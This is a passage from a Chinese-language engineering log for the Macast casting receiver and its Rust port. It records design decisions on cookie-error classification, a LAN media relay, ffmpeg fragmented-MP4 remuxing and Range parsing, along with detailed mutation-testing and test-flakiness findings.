not_found，而"这台没有档案"比"这里没有文件"可行动。**整张表的顺序都是承重的，而且是被量出来的**：`locked`
必须排在 `not_found` 前面，因为 `Could not copy Chrome cookie database` 那句里**也含有**一个
not-found 的碎片（单数 `'cookie database'` 在整个已安装 `yt_dlp` 包里**只出现这一次**，就在 :363
那句 locked 自己的话里；每一条 not-found 的 raise 用的都是复数 `cookies database`）。把 `not_found`
挪到前面，一台**浏览器正开着**的 Windows 会被判成"找不到库"，卡片于是让用户去指一个**就在眼前的目录**
而不是让他退出浏览器。这条嵌套由 Part 59 两用例守着：一条问顺序换过来会答错，一条要求那个单数碎片
**必须真的还在 `not_found` 那一行的词表里** —— 因为删掉它之后，"这句里含有它"就变成一句关于文字的谎
（第一版就是这样，删碎片 0 红）。**用例把卡片与分类器绑死**：Q 段读页面里那四个 `v-if`/`v-else-if` 分支的族名集合，要求它**恰好等于** `COOKIE_PROBLEMS`（加一态少一态都会红），并且每一句必须含它自己那个下一步（去哪个目录、要不要退出浏览器、钥匙串、把冒号后面去掉）—— §4.8 那条「每一条失败文案必须给出下一步」在这里的形状。**没有第五态**，因为纯垃圾 jar 在**粘贴那一刻**就被拦了（`cookie_jar_state` 数到 `cookies == 0` 就回 `code: 1` 并念出看不懂几行），它根本到不了引擎；可达的是混排那份，而它的修法在 `engine_note()` 上，不在词表上加一行 |
| **`_COOKIE_WORDS` 是猜的，所以要写在后端** | 每个 extractor 说"要会话"的措辞都不同（bilibili 写 `cookies to access this webpage`、tiktok 写 `Fresh cookies (not necessarily logged in) are needed`），退出码**从不区分**它和"这站没有视频"。所以 `needs_cookies()` 按词判，且卡片上那句「这通常是站点要会话 cookie」只在它成立时出现 —— 反过来把不相关的拒绝也标成"要登录"，就是把用户送去装一个用不上的扩展 |
| **设备列表第一行永远是「本机」，而且那一半是核心的** | `Handler._cast_targets()` 把 `[_local_target()] + 插件的 items` 拼出来，**插件不许自己塞这一行**（否则第二次读就是两个"本机"）。`id` 是 `local`，`name` 是**当前渲染器的标题**（`Setting.get(Macast_Renderer)`，和 `query=status` 报同一个值），因为「本机」不是一个东西：选 mpv 时它是这台 Mac 上的窗口，选 Local File Caster 时它是那个插件自己挑的设备。列表复用 `cast_local_file` 的 `target_state()` / `target_refresh()`（**mDNS + SSDP，异步刷新**），`refresh=1` 只回"搜索已启动"和缓存，**同步探三秒会按住一个 CherryPy worker 说一件下次轮询照样说的话**。协议代码一行没新增 |
| **投给设备不改我们自己的播放态** | `target` 为空或 `local` → `_cast_url()`（今天的渲染器 `cast_uri`）；否则 → 插件的 `target_push()`，**不碰** `set_media_url` / `state` / `playing`。理由写在处理器的 docstring 里：卡片可以在另一台播放器正播着的时候往电视上推，两个主人会让状态页对两件事同时说「正在播放」。电视播多久、什么时候停，**由电视自己决定** |
| **中转门 = 每会话随机 id + TTL，故意不要令牌** | 那条链接天生就是给电视用的，而这里**没有管理面可开放**（`/relay/<id>/media` 只吐字节）。id 用 `hmac.compare_digest` 常量时间比对（`_find_locked`），`secrets.token_urlsafe(16)`。**代价要说清：它不是保密通道** —— 链接被转发出去，拿到的人就能读这路流。这与 §4.8「观看地址绝不用常驻 `Api_Token`」是**同一个原则的两种形状**，不是互相打脸：两边都不许出现管理令牌，而这里的随机 id 只买到"局域网里没人猜得到别人的路径" |
| **`advertise_host()` 在核心和插件里各有一份** | `Setting.get_ip()` 回的是 `(addr, netmask)` **对**，`get_advertisable_ip()` 又按 set 顺序把 VM 网桥和 Tailscale 都算进来 —— 拿它第一个元素，交出去的网址**打印得出来但打不开**。两份副本都必须走 `discovery.advertisable_addresses()`（mDNS 实际广播的那个口），因为核心不许 import 插件。Part 59 用一张**打桩的四态网卡表**把两份钉在一起，不是各测各的 |
| **失败的中转立刻按 id 摘除** | `open_relay()` 总是先 `add`，所以用例断言的是**前后集合相等** —— 那就是 `drop()` 跑过的证明。别把这里和 `RELAY_MAX = 8` 的**驱逐**混成一件事（驱逐是"最不活跃的那条被挤出去"，走的是另一条路径，另有专门用例）。§4.2「被反复重启的 Macast 会攒播放器」同一方向：一次失败的会话还占着一个槽 = 一个带延时的 bug |
| **探针与规划在管理 POST 里同步跑** | 源站拒绝必须在**按下按钮那一刻**说出来（「中转启动失败：源站拒绝了这条地址」），而不是留给用户一台黑屏的电视去猜。渲染器拒绝时**中转一起拆**，并且把渲染器自己的答复原样交出去 —— 回一个"成功"外加一路没人听的流是双重谎 |
| **转封装写的是会增长的分片 MP4** | 与 §4.8 里 `cast_local_file` 同一条理由：管道没长度、不能重连、不能拖动。**但"会增长的文件"必须写成播放器此刻就能打开的那种**：`-movflags +frag_keyframe+empty_moov+default_base_moof` **并且** `-flush_packets 1`。标准 MP4 的 `moov` 由 ffmpeg 在**退出时**才搬到文件头，所以半截文件对任何播放器回 `moov atom not found`（2026-10-04 真站探针量到的，不是推断）；分片容器把轨道表放在开头的 `empty_moov` 里，之后每个 `moof`+`mdat` 自描述，**前缀本身就是可读的文件**。`-flush_packets 1` 是那约 256 KiB 写缓冲的另一半：只有 frag 没有 flush，600 kbit 夹具上那份会增长的文件在 3 秒里停在 **28 字节**，读起来像"容器没生效"。后缀、`video/mp4` 类型与孤儿清扫都不变。代价因此只剩一句：**写完之前没有可信长度**（`relay.length`/`ranges` 在退出 0 那一刻才成真值），所以拖动要等它写完。卡片上那半句话就是这件事（「转封装能边写边播；写完之前没有可信长度，拖动要等它写完」），由 `plan()` 的返回值决定，页面不许另抄一份。**这句话改过两次**：v0.18 只说「拖动要用完才准」，低估了前半件；前半件随分片容器作废，后半件仍然成立 |
| **`-bsf:a aac_adtstoasc` 只在音频真是 ADTS 时才加，而且第二次命令由 ffmpeg 的话触发** | mp4 muxer 拒绝 ADTS AAC：9.0.2 在一路**混流 TS**（`audio_codec` 问不出来，因为清单没写 `CODECS=`、度量又没排上）上报错 `Malformed AAC bitstream detected: use the audio bitstream filter 'aac_adtstoasc' to fix it` 然后**退出 255**，并且已经写下 **23,417 字节的垃圾**。加了过滤器同一份输入退出 **0 / 527,088 字节**。但过滤器**不是无条件安全**：opus 与 mp2 带它各自退出 **234 且零字节**，所以第一问按编解码名（`needs_adtstoasc`，`AAC_CODECS = ('aac','mp4a')` —— 后一个是同一个编解码在 `acodec`/RtpMap 里的拼法），问不出来就交给第二问 —— `watch_remux` 认出 ffmpeg **自己的那句原话**（`ADTS_TELLS`）就翻一次闩重跑一次（`_retry_adtstoasc`：先删掉那 23 KB 再重新 spawn，否则正等在 `remux_has_bytes` 里的观看者会拿到一个 200 而播不出任何东西；`code == 0 or relay.adtstoasc or not tells_adts(...)` 三问保证它**只跑一次、不可能循环**）。这与 §4.2「假命令行工具的输出必须是真工具在这台机器上的逐字输出」、`screen_mirror` 的 `_DDAGRAB_FAILURE` 是同一个习惯：**信工具自己怎么说**。整条 argv 现在从 relay 的字段重算（`_spawn_remux`），所以重试是翻一个布尔再调同一个函数，不是第二份 argv |
| **转封装的等待发生在响应头之前，而且等不到就不回 200** | `_pipe_file` 曾经在 ffmpeg 创建 `relay.path` 之前就打开它，`FileNotFoundError` 是 `OSError`，于是被 `_respond` 里"观看者已经走了"那一句**吞掉**：用户看到的是 **0.0013 秒返回的 200 + 0 字节**，mpv 报「Failed to recognize file format」→「File error」，而这正是这个模块存在的理由要消灭的那个症状。现在是 `remux_has_bytes(relay, GROW_WAIT_SECONDS, GROW_POLL)`：**等不到就 502（作业已经失败，带上 ffmpeg 的原因）或 503（还在跑但一个字节都没写出来），绝不再回一句成功的 200**。监听器是 `ThreadingHTTPServer` 且 `daemon_threads = True`，所以这次有上限的等待只占住它自己那一条线程 |

**Rust 侧移植这一层时量到的三件事**（2026-10-13，`macast-cast/src/relay.rs`，49 条中转用例）：

* **两支定点变异第一次都是 0 红，而它们问的正是这一节最贵的两条红线。** 把
  「等不到字节就不回 200」那道门改成恒假，套件**一条不红**；把「设备的 Range 翻译给源站」
  改成不发，**也是 0 红**。原因不是实现对，而是**每一份夹具都处在文件已就位的中转上**：
  `wait_for_bytes` 第一眼就为真，而代理那条路根本没有端到端的用例（源站桩只服务两个连接，
  都被探测用掉了）。补法两条，都是"让那格可达"而不是"再断言一次"：① 一个**文件存在但为空、
  状态仍是 running** 的中转，必须拿到 **503**（另一个是**转封装失败 → 502**，两句是不同的
  劝告：没坏与坏了，页面只有对第二种才让用户重试）；② 一条**真的把请求送出去**的代理用例，
  假源站把收到的 `Range` 记下来并断言中转问的是 `bytes=100-199` —— 这条也是上面 §4.2 那条
  代理默认值唯一能变红的地方。**"0 红"在这里不是"覆盖够"，是"这一格没人问过"**，
  与 §4.2「不提问的检查等于通过的检查」同一条。
* **等待预算是接缝，不是常量。** 两个等待——响应头之前的那个、以及读到 EOF 之后管道里的那个
  ——是**同一条策略**（"读者可以先干等多久，才轮到'还没有'这个诚实答案"），Python 里因此都是
  `GROW_WAIT_SECONDS`。写死成各自的常量之后，第二条用例单跑要 **21 秒**（它先等满 20 秒的
  `Complete` 才立刻命中 `Failed`），而且**一个夹具里两条预算可以悄悄漂成不同值**。合成一个
  连接级参数之后，那条用例 0.3 秒跑完，而"两个等待必须同时存在"这件事重新变成一句能问的话。
* **后缀区间与垃圾值都读起来像"没有起点"，但它们是两个答案**（`parse_range` 的三态形状，
  §4.2「空结果要说清是哪一种空」在中转侧的形状）：`bytes=-500` 要交出**最后 500 字节**，
  而 `kilobytes=0-9`、`bytes=9-0`、多区间都要交出**整份**（RFC 7233：不能用的 Range 忽略，
  不是回 416——416 是 DLNA 渲染器读成"文件死了"的信号）。第一版把后缀区间归进垃圾，
  于是播放器要尾部时收到**整份文件**：不报错、不慢、只是拖不动，而症状读起来像"这台电视不支持
  拖动"。所以 `parse_range` 的返回值是 `(Option<u64>, Option<u64>)` 而不是 `(u64, Option<u64>)`——
  两种形状在纸上只差一个 `Option`，在答案上差整份文件。

**Rust 侧把这一层接进管理面时量到的三件事**（2026-10-13，`macast-upnp/src/http.rs` 的路由表 +
`src-tauri/src/host.rs` 的 `ShellManagement`，`scripts/verify_rust_receiver.sh` 14–17 节）：

* **`parse_query` 不做百分号解码，而浏览器和 `curl --data-urlencode` 什么都编码。** 第一版
  Rust 侧把 query 串按 `&`/`=` 切开就直接交出去，于是 `?query=cast&url=https%3A%2F%2Fhost%2Fa.mp4`
  读到的地址是 `https%3A%2F%2Fhost%2F...` —— 它过不了"必须是绝对地址"那一问，用户听到的仍是
  「不是一个完整的媒体地址」，而那句话读起来像**用户写错了**，不是像"我们没读他的字节"。
  真 Python 侧这一路走 `urllib.parse.unquote_plus`，而它的**顺序是承重的**：
  **先把 `+` 换成空格，再按字节切 `%`**，所以 `%2B` 与 `+` 是两个答案（`'a%2Bb+c'` → `'a+b c'`），
  而 `%` 后面不是两个十六进制字符时**百分号原样留着、尾巴不再扫第二遍**（`'%zz'` → `'%zz'`），
  单个坏字节只换**一个**替换字符（`'%C3%A9x%E7'` → `'éx\ufffd'` —— 那三个 `%` 项在字节层面
  先拼成 `é x \xE7`，解码时才塌成一个 `\ufffd`；按字符处理会得到两个）。这三格都写进了
  `unquote_plus` 的实现与用例，因为**它们从纸面上看都像"可以简化"**。
  **一处刻意的偏离，写在 docstring 里而不是偷偷改掉**：cherrypy 对 query 用
  `errors='strict'`，一个 `?url=%FF` 在它那里是 **404**（`lib/httputil.py:321-364`），而它的
  form body 那条路（`_cpreqbody.py:143-166`）先重试声明的字符集；这一路**有损解码并继续路由**，
  用户读到的是「不认识的字段」那一句而不是一个空白页。理由也写在那里：这一格不是
  "发送端打错了"的判决点，而 404 不带正文、不带解释，是一台设备 mistype 一个字节
  时最不该听到的答复。**"和参考实现不一样"必须是文档，不能是沉默**。
* **验收脚本自己撒了两次谎，两次都长得像"产品坏了"。** ① 13 节投屏时传的是 `cast-title=`，
  而**这一张脸的名字键叫 `title`**（`macast/protocol.py:2086`；`cast-title` 属于 POST `cast-uri`
  那一张脸，`:2705`）—— 传错键不报错，只是"没意见"，于是 mpv 窗口永远读回 `media`，
  而我第一版把它写成了 §4.2 那条命名接缝的回归；② 同一条用例断言 `message` 等于「已投屏」，
  而成功文档的字面量是 `success`（`:1674-1696` 那一次 `{'code': 0, 'message': 'success', 'url': …, 'title': …}`）。
  **两条都是改脚本、不改产品**，判据不变：窗口那一格仍然问 `force-media-title`，
  **永远不问 `filename`**（中转地址末段注定是 `media`，那正是 `media - mpv` 的字面来源）。
* **`origin` 不是可钉的读数：`dedupe()` 让 yt-dlp 那一行赢。** 15 节原来断言
  `candidates.0.origin == "page"`、`label == "video:src"`，理由是"这一条是我们从 HTML 读到的"。
  在装了 `yt-dlp` 的机器上它**红了**：`origin='ytdlp' label='mp4'` —— 而
  `macast/media_resolve.py:1013-1028` 那条规则从来就是**同址两行时 ytdlp 那行留下**，
  页面那一行只贡献它的 `<title>`（`page_wording()`）。所以这一格换成了问**规则**而不是问**引擎名**：
  同一个地址**恰好占一行**，`origin ∈ {page, ytdlp}` 两者都算认账。**这是一条会随场上装了哪些包
  换颜色的用例**（§4.2「假命令行工具的输出」与 Part 59 那条 `find_command` 打桩是同一族），
  而它第一次写出来时钉的是**去重的那一败者** —— 全绿只因为写它的那台机器没装 yt-dlp。

**Rust 侧接 cookie 面板与设备下拉时量到的四件事**（2026-10-14，`macast-upnp/src/http.rs` 的
`GET_MANAGEMENT_ROUTES` / `POST_MANAGEMENT_ROUTES` + `src-tauri/src/host.rs` 的
`cookie_state` / `save_cookies` / `clear_cookies` / `set_cookie_browser` / `cast_targets`，
`scripts/verify_rust_receiver.sh` 18–19 节，共 **22 + 13** 条，整跑 **133 条 / EXIT=0**）：

* **"还没有这一面"必须答成一份完整的文档，而不是一个空。** `query=cast-targets` 在这个壳里落在
  #22（渲染器插件的 `target_push` 面）之前，所以它答的是参考实现的那句拒绝原话，但**形状是参考实现的**：
  `targets = {"items": [], "searching": false, "known": false}` —— 两个布尔**必须存在且为假**，
  少了它们页面就以为"还在搜"而**永远轮下去**。一次不答复与一份说清局限的答复，对卡片是两种命运；
  这一格由 19 节按**键的集合与顺序**逐项比对，而不是只断言"有拒绝消息"。
  而且拒绝**不许点名本机路径**（局域网调用者读到的那句话里不能出现配置目录），这条也是按串查过的。
* **投屏交接窗口在 connect **之前**就存在，所以"槽位有没有东西"不是一个真问题。**
  `connect_once` 逐字照 `mpv.py:404` 走 —— 那里 `self.ipc_sock = socket.socket(...)` 先赋值、
  再 `.connect()`，所以中途 `is_none()` 答"没有 socket"而唯一的事实是"有一个 socket 对象"。
  真机第一跑（`/tmp/vrr_18_19.txt`）就是靠这一格红回来的：五条
  `sendCommand: [Errno 57] Socket is not connected` 之后 `TransportState never read PLAYING（saw: PAUSED_PLAYBACK ×60）`
  —— 投屏**被写进了一根没有对端的描述符**，日志记下了，而恢复机制根本不知道它来过。
  判据从 `is_none()` 换成 `socket_carries_writes()` = `!link.is_closed() && link.is_connected()`，
  即"这一刻写下去能不能被读到"，而不是"手里有没有一个对象"。
* **同一句谓词的两问各自看得到对方看不到的东西，而其中一问在这台 Mac 上没有见证者 —— 两半都要留字。**
  `is_connected()` 是唯一能看见"从没连上过"的那一问；`is_closed()` 是唯一**不依赖内核意见**的那一问，
  因为 `close()` 是 `shutdown(Both)` 而**故意不丢掉描述符**（读循环持有同一根 socket 的 `Arc`），
  少了它，一次 `Session::Ended` 之后到达的投屏会被写进没人读的 socket，并**读成"已经交出去了"**。
  **这台机器实测**（2026-10-14，直接问 `getpeername(2)`）：我们自己 `shutdown(2)` 之后、以及对端关掉之后，
  它抛的都是 `[Errno 22] Invalid argument` 而**不是** `ENOTCONN`（`sendall` 两种情况都是 `[Errno 32] Broken pipe`）。
  所以 macOS 上两问对"关掉的链接"给同一个答复，第二问在这里看起来是多余的 ——
  **而 Linux 那一半从未被这台机器问过**，所以照旧问，且这句话写进 `set_media_url` 与 `Link::is_connected` 的
  docstring，不留给"看起来更简洁"的下一次重写。
  第一版的用例正是反着错的：它断言"我们关掉之后内核仍然认它有对端"，那条陈述是从计划里抄的、
  **没问过机器**，跑起来当场红（§4.13 那句"一个没被机器问过的数字"的内核版本）。
  两支定点变异体的读数（各一条命令，`/tmp` 备份还原 + md5 校验）：删掉内核那一问红 **1** 条
  （未连接的套接字那一格），删掉 `is_closed()` 红 **0** 条 —— 因为"关掉"那一格的停放仍由内核的答案承担，
  而那句 `[Errno 9] Bad file descriptor` 是 `send_all` 自己读的同一个标志。**这条 0 红是覆盖空洞，不是"覆盖够"**
  （§4.14 中转那一节那条同一条），已按原样记在测试的注里，而不是去补一条假见证。
* **cookie 是凭据，所以它的 Rust 侧落点全在"拒绝也不许动磁盘"这一类判据上。** jar 以
  `OpenOptionsExt::mode(0o600)` 写成 `<name>.tmp` 再 `std::fs::rename` 原子换过（**不备份旧的那份** ——
  一个会主动覆盖凭据的功能不该留下副本），面板/日志/HTTP **只报条数、名字与路径，永不报值**；
  `COOKIE_JAR_MAX_BYTES`（256 KiB）**只在粘贴时**拒，读取路径自己不受它管；
  行解析照 `MozillaCookieJar._really_load` 的顺序（先字节判空，再在**原始行**的 index 0 剥 `#HttpOnly_`，
  然后才跳空行与 `#`，够 7 个 TAB 字段且第 0 字段非空才算 cookie）；
  浏览器白名单**读侧与写侧各查一次**（那个值坐在可手改的高级设置 JSON 里）；
  "关"是一组值 `["", "0", "off", "none", "关闭", "不用"]` ⇒ `unset` 而不是存一个 `false`（§4.2 那条）。
  18 节是**有状态的一整趟**（冷读 → 粘贴 → 权限与泄漏 → 垃圾行 → 超限 → 设浏览器 → 两种拒绝形状 →
  清空 → 再清空 → 关 → 复读），**两次拒绝都用 md5 对着这一节早先存下的 jar 比过字节**，
  所以"拒绝之后文件原地不动"这句话不是断言，是读数。

**Rust 侧移植发送端这一层时量到的事**（2026-10-17，`macast-cast/src/push.rs` ←
`cast_local_file.py` 的 `CastSender` / `DlnaSender` / `push_url_to`，
见证用例在 `macast-cast/src/push_tests.rs`，**46** 条；`cargo test -p macast-cast --lib`
整跑 **603 passed / 0 failed**）：

* **两只计数仪器必须给出同一个数，而 `grep` 那只会骗人。** `--list` 数出 603，
  按字面量扫 `src/*.rs` 里 `#[test]` 也数出 603；`grep -cx '#[test]'` 给出 **610** ——
  因为 `[test]` 在 POSIX 括号类里是**六个单字符的集合**，不是字面量（它把 `#[testX]`
  这类不存在的行也算得进去，多出的 7 是它把别的东西数重了）。计数坐在
  `proto.rs:431` 的 `TESTS_IN_THIS_CRATE: usize = 603`，而**这个常量本身是承重的**：
  那条全仓扫描用例要求"扫到的用例数 ≥ 常量"，所以常量留在旧值（这一轮是
  65 → 602 → 603 三级台阶）时新增的用例**不会被要求先钉日志目录**，
  而套件照样全绿 —— **一个过低的地板不是"少问一句"，是"这一格从此无人提问"**。
  各文件贡献（同一趟按文件扫出，加总 603）：`airplay_tests` 60、`cert` 12、
  `channel_tests` 36、`charmap_tests` 2、`engine_tests` 17、`job_tests` 162、
  `mdns_tests` 66、`proto` 19、`push_tests` 46、`relay_tests` 63、`resolve` 39、
  `scrape_tests` 6、`targets_tests` 75。
* **八支定点变异，逐支的读数与红在哪一条**（每支一条命令，`/tmp` 备份 + 还原 +
  md5 回到 `61122cf4…`，日志留在 `/tmp/mut_*.txt`；这一节的每个数都能从那批文件重算）：
  ① 把 `SOAPAction` 的值去掉那对引号 ⇒ **1** 红（`the_dlna_headers_are_the_ones_python_sends`）；
  ② 把 `local_name(tag).ends_with("response")` 改成按**原始标签**比对 ⇒ **4** 红
  （`the_dlna_arm_asks_for_the_transport_state_by_local_name`、
  `a_non_xml_transport_state_keeps_the_last_state_and_warns`、
  `the_instance_id_echo_teaches_the_next_envelope`、
  `an_unknown_target_kind_pushes_over_the_wire_it_does_speak`）—— 四而不是 1 是**结构性连带**：
  这三个读答复的地方共用同一个 `local_name` 判据，而最后那一条问的是"不认识的目标种类
  仍然走它真的会说的那条线"；③ `MAX_HANDOFFS = 4 → 5` ⇒ **1** 红
  （`a_fifth_handoff_closes_the_first`），**而且必须连着记一件事**：同一模块里那条
  `the_ledger_size_is_a_property_of_the_constant` 断的是"推 `MAX_HANDOFFS + 1` 次之后
  `handoff_count() == MAX_HANDOFFS`"，**它对任何上限值都成立**，所以在那一支下它是**设计上**的绿，
  不是漏测 —— 这条账本用法的常量在测试里只能被"再推一个"那种形状问；
  ④ `"streamType": if live { "LIVE" }` 翻成 `BUFFERED` ⇒ **1** 红
  （`a_live_push_promises_LIVE_on_the_wire`）；⑤ 去掉 `playerState` 那次 `to_uppercase()`
  ⇒ **1** 红（`the_player_state_is_upper_cased`），而**这一支第一次是编译错误不是变异体**：
  删掉 `.to_uppercase()` 把 `String` 变成 `&str`，`E0308` 之后**一条用例都没跑**，
  而只看退出码时它与"这一格没人问"长得一模一样 —— 变异体必须**同型替换**；
  ⑥ 把 `remember()` 的 `drain(..keep_from)` 翻成 `drain(keep_from..)` ⇒ **5** 红
  （`a_fifth_handoff_closes_the_first`、`handoffs_evict_the_oldest_only_past_the_cap`、
  `two_presses_are_two_handoffs`、`the_full_cast_push_reaches_the_device_and_the_handoff_list`、
  `a_thread_that_does_not_own_the_ledger_leaves_it_alone`），**而红法不是"驱逐了错的那一个"**：
  `len ≤ 上限` 时 `keep_from == 0`，`drain(0..)` 把**整个账本倒空**，
  于是每条断言读回的都是 `left: 0, right: 1` —— 症状是"每一次成功投屏都交不出 socket"。
  这一支量到的是"保留这件事存在"，**不是**"保留哪一头"，写在这里是因为它会误导下一个人
  去以为 5 红是"方向"的牙；⑦⑧ 见下面那条"撤回的 0 红"。
* **两支曾在本文件的注释里记为「0 红」，本轮对现有用例重测，各答 1 红，旧句子已撤回。**
  把 `build_didl` 的门 `duration != 0.0` 翻成 `duration > 0.0` ⇒ **1** 红
  （`build_didl_writes_zero_clock_for_an_infinite_duration`），而且红在**负无穷那一行** ——
  `+inf > 0.0` 为真，两种判据下都过，所以这个见证的全部重量落在负数/NaN 行上；
  把 `connect()` 里 `let _ = self.recv()?;` 的 `?` 删掉 ⇒ **1** 红
  （`a_device_that_never_answers_the_challenge_is_not_a_connected_sender`），
  因为读照样失败，但没有 `?` 时 `connect()` 交回一个**自认为已连接**的发送端，
  而那句 `.err().expect(...)` 正是唯一问得出这件事的位置。两处读数现在**写在提问的那两条用例里**，
  模块头只留"这两支重测过、旧判定没有复现"这一句。**同一族还有一格永远问不到，两半都要留字**：
  `connect()` 的两个 arm 在本文件里是**不可达**而不是未测 —— `"没有可用的地址"` 需要
  `to_socket_addrs()` 返回 `Ok` 且迭代器**为空**（调用方能给出的名字要么解析要么报错，
  没有"解析成零个地址"的夹具），`"目标地址无法作为 TLS 服务器名"` 需要 `ServerName::try_from`
  在**已经解析成功之后**失败（rustls 在解析之前就不认空名与坏名）。
* **两族新的"共享夹具"碰撞，都是 §4.2「并行跑的用例共享夹具路径，单跑绿、整组红」的成员。**
  ① **账本所有权**：一次**成功**的 cast push 会把活的 TLS socket 停进进程级
  `handoffs()`，而脚本设备在它被排空之前**看不到 EOF** —— 所以这个模块用
  `static PUSH_GATE: Mutex<()>` + `OWNS_PUSH_LEDGER` 把账本串行化，并用
  `wait_closed(&device, want)`（5 秒上限）而不是抓一瞬间来判"socket 真的交出去了"。
  ② **日志阈值**：`macast_core::logging` 的 `static THRESHOLD: AtomicU8`（`logging.rs:69`，
  默认 Info）是**进程级**的，而 `Logger::log` 在 `level < threshold()` 时提前返回 ——
  于是**一个空的见证文件证明的是"被过滤了"，永远不是"字节没刷盘"**（这句是本轮最贵的一格，
  因为它把"读不到"读成"写不出"就往产品里改）。`targets_tests` 里裸写 DEBUG 的配对落在
  `mdns_tests` 的 DEBUG 窗口内 ⇒ **并发整 crate 5 红 / 24 次**（红的永远是
  `mdns_tests.rs:677` 与 `:721` 那两条），**串行 12 次 0 红**。修法是 crate 级
  `#[cfg(test)] static DEBUG_WINDOW_GATE: Mutex<()>` + RAII `DebugWindow`
  （**Drop 体在 guard 字段析构之前**把阈值放回 INFO —— 顺序反了就等于在窗口里放行了别人），
  而它的强制手段是**文本扫描**（`proto.rs` 的 `only_lib_rs_touches_the_log_threshold`，
   needles 用 `format!` 拼接因为 `proto.rs` 自己也在扫描范围内；地板 `owner_calls == 2` 与
  `windows >= 12` = 4 个 mdns + 8 个 targets）。**为什么不是行为用例**：复发是**间歇性**的，
  一条计时用例今天问不到，而"只有 `lib.rs` 能动阈值"这句话本来就是一个静态事实。
* **三个"一个主人"的收敛（本轮顺手做掉的，都是"预算是参数、策略是主人"那个形状）**：
  `resolve::no_proxy_agent(timeout)`（清代理是策略，超时由调用方给）、
  `resolve::number_or(v, default)`（对应 Python `number(value, default)`，
  `cast_local_file.py:1791`）、`macast-core` 的键表新增 `Key::Timeout`（26 → 27 条），
  因为 `cast_local_file.py:164` 声明了 `Timeout = 15` 而 `Setting.get` 按
  `property.name` 索引那份共享 dict —— **不加这个键，投屏超时就只能是一个没人认领的字面量**。
  `push.rs:148-151` 因此是 `number_or(&setting.get(Key::Timeout, json!(5)), DEFAULT_TIMEOUT_SECONDS)`，
  而不是第三处自己解析 JSON。
* **`push.rs` 在这一轮一个字节都没改**（八支变异的 md5 全部回到 `61122cf4…`），
  五处红法都由**用例**补齐而不是放宽断言 —— 包括那条 `a_fifth_handoff_closes_the_first`：
  它第一版红在 `left: [] right: [0]`，修法是给测试加 `wait_closed`，
  而不是把断言改成" eventual "。**以及本分支从未推送 ⇒ 上面 603 条与这八个读数没有任何 CI 见证过**
  （§16 第 2 条那句"这台机器的读数只来自这台机器"在这里同样成立）。


**Rust 侧把设备下拉接活时量到的事**（2026-10-18，`src-tauri/src/host.rs` 的 `cast_targets`
与 `cast_resolved` 设备臂 + `macast-cast/src/relay.rs` 的两个访问器 +
`scripts/verify_rust_receiver.sh` §16（13 条）/§19（21 条），整跑 **143 条 / EXIT=0**）：

* **接线买到的第一样东西是一句真话换掉一句谎**：`query=cast-targets` 此前答的是参考实现的
  **完整拒绝文档**，句子是「这台设备还投不了：本机的 Rust 壳还没有设备发送面」—— 而 `push.rs`
  与 `targets.rs` 早就都在树里，那句话每说一天就多活一天。判据同一条再量一遍：
  `grep -rn "targets::" src-tauri/src/` 从 **0 行** 变成 **2 行**（表进 `ShellManagement` 的字段、
  `Table::new(setting)` 在 `main.rs`）。设备臂做的是参考实现的两步（`target_by_id` →
  `push_url_to`），**换上去的文案逐字抄自 `cast_local_file.py:2926-2927`**（"列表里没有这一台"，
  不是"发送不出去"），而旧句子不许复活：§16 里那条 **反向** 断言（设备臂再说「这台设备还投不了」
  就红）就是这一格的看守。
* **本机那一行归核心，不归表**（§4.14 上面那条老规矩在 Rust 侧的形状）：行的 `name` 读
  `Key::MacastRenderer` 再 **`'' or 'MPV'`**，而 `query=status` 的 `renderer` 交回**没有兜底的存储值** ——
  干净安装上这两句**合法地不一样**（一个答"存了什么"，一个答"按下投屏会到哪儿"）。
  §19 因此不是把两个串对齐，而是**分两种场上状态各问一遍**：`status` 为空 ⇒ 行必须是 `MPV`，
  `status` 非空 ⇒ 行必须逐字等于它。
* **`searching` 在一台发现不到设备的机器上永远为真，而且这是设计不是故障**：冷启动那条踢法的
  字面结果是"两份缓存都空 ⇒ 再起一次搜索"，所以缓存填不满时**每一次轮询都恰好看见有人在搜**。
  第一版 §19 写了一条"等它 20 秒内变假"的判据 —— **在这台机器上不可能为真**（那就成了第二个
  Part 34：一组永远红的用例，教人学会忽略红）。删掉之后改断**闩**（连续两次 `refresh=1`
  至多一次真的起搜），并且把"这条检查没证明什么"写在检查旁边：那种场上读数永远是
  `started=false/false`，而"起飞的搜索会落地"这一问只有 `targets_tests` 那两条拿着
  `HoldGate` 放行的 `k_…` 用例答得出，真机答不出。当场读数：
  **`this LAN offered 1 row(s) (known=false, searching=true)`** —— 那一行就是本机。
* **"0 红"这一次出现在看起来对的那台仪器上**：`targets_tests` 里"断言见证文件为空"的七条
  被**进程级日志阈值**（`macast_core::logging::THRESHOLD` 是一个 `static AtomicU8`）决定生死。
  改成按**级别**判（新增 `loud()`：只看 INFO 及以上）之前的读数是 **`--lib targets` 14 跑红 12**，
  而**整 crate 6 跑红 0**；之后是模块级 4 跑 0 红、整 crate 3 跑 0 红（**603 passed**，约 7 秒一趟）。
  上一轮的 `DebugWindow` 只收了"读 DEBUG 的那一半"，没收"断言沉默的那一半"。
  两条都写进了设计文档（§13.1 两个粒度 + §16 第 9 条），因为**一句"整 crate 绿"会被复述成
  "这一族没问题"**，而那正是这次差点发生的误判。
* **一条按级别断言的沉默才是一条沉默**：那份见证文件里其实有一行 DEBUG
  （`cannot parse http://10.0.0.7/d: document ends with 4 element(s) still open`），
  而它是**正确的产品行为** —— 旧断言只在默认阈值把它藏起来时为真，也就是**关于测试调度器的判决
  穿着产品判决的衣服**。改完红的时候仍然把整份文件印出来（`"{}", lines(&path)`），
  所以被放宽的不是证据；测试自己的散文也从"no log line"改成"nothing loud"，因为那句原话现在**是假的**。
* **同一支验收脚本的第三次撒谎，这次长得像一条 PASS**：那条文案里把「local」这个字段名
  用**反引号**包了起来 —— 而它在双引号字符串里，**双引号里的反引号就是命令替换**。脚本于是真的
  执行了 `local`，在 top-level 报 `local: can only be used in a function`，把那半句文案印成
  **空串**，然后**照样记了一条 PASS**（run 1 的输出第 163 行，指脚本第 1533 行，位置在 §19）。
  判据收在**形状**上而不是这次的内容上：
  `` grep -c 'pass "[^"]*`\|fail "[^"]*`' scripts/verify_rust_receiver.sh `` **必须是 0**
  （本轮量过：0）。与 §4.2「假 ffmpeg 抄虚构格式」、§4.14「验收脚本自己撒了两次谎」同一族：
  **测试自己的代码也是实现**，而这一支的差别是它骗人的方式是**一条绿色**，不是红。
* **同一族第四次：那条"必须是 0"的审计自己漏了，而它漏的方式是被抄的那个 0**
